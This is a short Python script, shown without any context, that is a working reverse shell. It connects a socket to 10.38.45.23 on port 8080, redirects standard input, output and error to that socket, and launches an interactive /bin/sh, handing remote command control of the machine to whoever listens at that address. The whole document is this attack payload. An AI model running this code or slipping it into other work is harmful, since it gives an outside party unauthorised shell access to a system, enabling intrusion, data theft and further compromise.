import socket,subprocess,os;

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.38.45.23",8080));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
